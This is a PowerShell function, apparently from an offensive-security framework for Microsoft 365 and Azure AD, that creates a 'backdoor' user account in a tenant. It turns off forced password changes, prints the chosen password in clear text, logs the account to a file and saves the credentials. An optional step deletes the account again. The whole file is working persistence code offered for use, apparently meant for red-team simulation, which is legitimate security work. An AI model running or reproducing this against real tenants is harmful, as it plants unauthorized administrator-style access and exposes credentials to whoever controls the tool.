#Create a user
function CreateAccount {
    mitre_details("CreateAccount")

    #Create Admin Account
    MAADWriteProcess "Fetching available domains"
    Get-AzureADDomain | Format-Table Name, SupportedServices, AuthenticationType
    $new_backdoor_username = Read-Host -Prompt "`n[?] Create Username for backdoor account (eg: user@domain.com)"
    $new_backdoor_pass = Read-Host -Prompt "`n[?] Create password for backdoor account (must comply with password policy)"
    $new_backdoor_display_name = Read-Host -Prompt "`n[?] Create Display Name for backdoor account (eg: Don Joe)"
    Write-Host ""
    $new_backdoor_display_name = $new_backdoor_display_name  -replace " ","" 
    $new_backdoor_pass_secure = ConvertTo-SecureString $new_backdoor_pass -AsPlainText -Force 

    #Create new account
    try {
        MAADWriteProcess "Attempting to deploy backdoor account in tenant"
        $PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile
        $PasswordProfile.Password = $new_backdoor_pass
        $PasswordProfile.EnforceChangePasswordPolicy = $false
        $PasswordProfile.ForceChangePasswordNextLogin = $false
        $backdoor_details = New-AzureADUser -DisplayName $new_backdoor_display_name -PasswordProfile $PasswordProfile -UserPrincipalName $new_backdoor_username -AccountEnabled $true -MailNickName $new_backdoor_display_name -ErrorAction Stop 
        Start-Sleep -Seconds 10
        MAADWriteProcess "Backdoor account added to tenant"
        MAADWriteProcess "Backdoor User -> $new_backdoor_display_name ($new_backdoor_username)"
        MAADWriteProcess "Backdoor Pass -> $new_backdoor_pass"
        $backdoor_details | Out-File -FilePath .\Outputs\Backdoor_Account.txt -Append
        MAADWriteProcess "Output Saved -> \MAAD-AF\Outputs\Backdoor_Account.txt"
        
        #Save to credential store
        AddCredentials "password" "CA_$new_backdoor_username-$(([DateTimeOffset](Get-Date)).ToUnixTimeSeconds())" $new_backdoor_username $new_backdoor_pass  

        MAADWriteSuccess "Backdoor Account Created"
        $allow_undo = $true
    }
    catch {
        MAADWriteError "Failed to create new backdoor account"
    }

    if ($allow_undo -eq $true){
        $user_confirm = Read-Host -Prompt "`n[?] Undo: Delete created backdoor (y/n)"
        Write-Host ""

        if ($user_confirm -notin "No","no","N","n") {
            try {
                MAADWriteProcess "Attempting to delete backdoor account -> $new_backdoor_username"
                Remove-AzureADUser -ObjectId $new_backdoor_username -ErrorAction Stop | Out-Null
                MAADWriteProcess "Deleted -> Account: $target_account"
                MAADWriteSuccess "Backdoor Account Deleted"
            }
            catch {
                MAADWriteError "Failed to delete backdoor account"
            }
        }
    }
    MAADPause
}